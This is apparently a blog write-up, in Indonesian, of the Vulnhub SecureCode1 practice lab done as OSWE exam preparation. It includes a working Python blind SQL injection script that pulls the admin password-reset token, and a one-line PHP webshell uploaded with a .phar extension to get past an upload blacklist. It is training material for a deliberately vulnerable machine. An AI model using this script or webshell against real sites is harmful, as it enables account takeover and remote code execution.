---
title: "Vulnhub Securecode1 [OSWE-prep]"
date: 2026-03-19T00:36:01+07:00
showtoc: true
tocopen: true
---

Download mesin dari https://vulnhub.com/entry/securecode-1,651/
# Compile x86_64 to Apple Silicon
## install qemu
Install qemu
```
$ brew install qemu
$ qemu-system-x86_64 --version
```
![qemu version](/img/Vulnhub-Securecode1/qemu-version.png)

## convert OVA to QCOW2
Lakukan ekstrak file
```
$ tar -xvf SecureCode1.ova
```
![ekstrak ova](/img/Vulnhub-Securecode1/extract-ova.png)

Lalu convert file vmdk ke qcow2
```
$ qemu-img convert -O qcow2 SecureCode1-disk1.vmdk SecureCode1-disk1.qcow2
```

## virtualization using UTM
Download dari https://getutm.app/ atau dari https://github.com/utmapp/UTM/releases kemudian pilih *emulate*
![emulate UTM](/img/Vulnhub-Securecode1/UTM-start.png)
Lalu bagian 
```
'Operating System' pilih 'Other' 
'Hardware' pilih 'x86_x64' 
'Memory' set default '4096' 
'Boot Device' set ke 'None'
```

Setelah selesai create, lakukan 'Edit' lalu masuk ke 
```
section 'Drives' lalu 'Delete' bawaan 'IDE Drive' dan 'New' pilih 'Import' file QCOW2 yang sudah diconvert  
section 'QEMU' pilih unchecklist 'UEFI Boot'
```

# Blind SQL injection leads to account takeover
Lakukan directory scanning didapatkan file source code zip
```
$ feroxbuster --url http://192.168.64.2/ -k --depth 1 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x zip
..
..
200      GET      524l      985w    12155c http://192.168.64.2/asset/css/main.css
200      GET        1l      182w     6017c http://192.168.64.2/asset/vendor/countdowntime/moment-timezone.min.js
200      GET      103l      251w     3650c http://192.168.64.2/
301      GET        9l       28w      312c http://192.168.64.2/asset => http://192.168.64.2/asset/
200      GET    13371l    79598w  6529385c http://192.168.64.2/source_code.zip
..
..
```
lakukan ekstract didapatkan source code

Setelah dilakukan pengecekan path routing tidak ada mapping dari routing, pengecekan selanjutnya bahwa jika endpoint authenticated terdapat
```
include "../include/isAuthenticated.php";
``` 
Kemudian melakukan mapping unathenticated endpoint didapatkan
![mapping endpoint auth](/img/Vulnhub-Securecode1/mapping-auth-endpoint.png)

Endpoint /login tidak ada pengecekan isAuthenticated, kemudian melakukan pengecekan pada /login/resetPassword.php fungsi generateToken dan user input didapatan ada sanitasi.
```
[resetPassword.php]
$username = mysqli_real_escape_string($conn, @$_POST['username']);
..
..
function generateToken(){
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < 15; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
```
Selanjutnya pada /item/viewItem.php tidak ada pengecekan isAuthenticated.php yang berati unauthenticated endpoint dan juga vulnerable sql injection
![unauth sqli](/img/Vulnhub-Securecode1/blind-sqli.png)

Berdasarkan code, kondisi true didapatkan 404 
![true blind](/img/Vulnhub-Securecode1/sqli-true.png)

Kondisi false didapatkan 302
![false blind](/img/Vulnhub-Securecode1/sqli-false.png)

Pada db.sql didapatkan tabel user dan juga column token, skenarionya adalah melakukan reset password admin lalu ambil tokennya untuk change password.
![table sql](/img/Vulnhub-Securecode1/table-sql.png)

Script untuk fetch token
```
def send_sqli_request(ip, inj_str, j):
    target = "http://%s/item/viewItem.php?id=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
    r = requests.get(target)
    true = r.status_code == 404
    if true:
        return chr(j)
    return "" 

def inject(r, inj, ip):
    extracted = ""
    for i in range(1, r):
        injection_string = "1 AND (ASCII(SUBSTRING((%s),%d,1)))=[CHAR]" % (inj,i)
        with concurrent.futures.ThreadPoolExecutor(max_workers=94) as executor: 
                threads = executor.map(partial(send_sqli_request, ip, injection_string), list(range(32, 126)))
        retrieved_value = ""

        for extracted_char in threads:  # map method puts inject() results in a sequential order
                retrieved_value += extracted_char # into the threads list 
        
        if(retrieved_value):
             extracted += retrieved_value
             sys.stdout.write(extracted_char)
             sys.stdout.write(retrieved_value)
             sys.stdout.flush()
        else:
            print ("\b")
            break
    return extracted

def main():
    if len(sys.argv) != 2:
        print(("(+) usage: %s <target>")  % sys.argv[0])
        print(('(+) eg: %s 192.168.121.103')  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    def fetchToken():
        for i in range(0,1):
            queryToken = "SELECT token FROM user WHERE id_level=1 LIMIT %d,1" % i
            return inject(50, queryToken, ip)
```

Pada source code untuk change password akses
```
http://192.168.64.2/login/doResetPassword.php?token=
```
![success token](/img/Vulnhub-Securecode1/success-token.png)

Login didapatkan berhasil, ambil flag
![flag1](/img/Vulnhub-Securecode1/flag1.png)

# Bypass file upload extensions leads to remote code execution


Karena hanya 4 menu, setelah dilakukan analisis via web didapatkan ada file upload pada menu item, yaitu add item dan edit item.
Pada edit item menggunakan updateItem.php
```
http://192.168.64.2/item/editItem.php?id=1
```
![edit item](/img/Vulnhub-Securecode1/edititem-web.png)

Kemudian pada source didapatkan ada blacklist extension, berdasarkan dari blacklist kemungkinan yang lolos adalah 
```
php7,pht,phps,inc,phar, dan pgif
``` 
![controller edit item](/img/Vulnhub-Securecode1/sourcecode-fileupload.png)

Setelah dicoba semua extension, phar didapatkan berhasil.
payload phar
```
<?php echo "Shell";system($_GET['cmd']); ?>
```
![phar webshell](/img/Vulnhub-Securecode1/phar-webshell.png)

# OSWE STYLE
Penulis mengadaptasi pada OSWE dimana hanya satu script dijalankan akan eksploitasi satu mesin.
![oswe rules](/img/Vulnhub-Securecode1/oswe-rules.png) 

Secara flow source code didapatkan sebagai berikut:
```
1. request forgot password to generate token for admin
2. fetch token to bypass authentication using blind sql injection
3. upload phar to get webshell and reverse shell
```
![fetch all flag](/img/Vulnhub-Securecode1/all-flags.png) 

Untuk script akses [disini](https://github.com/ahm4ddm/oswe-preparation/blob/main/exp-securecode1.py)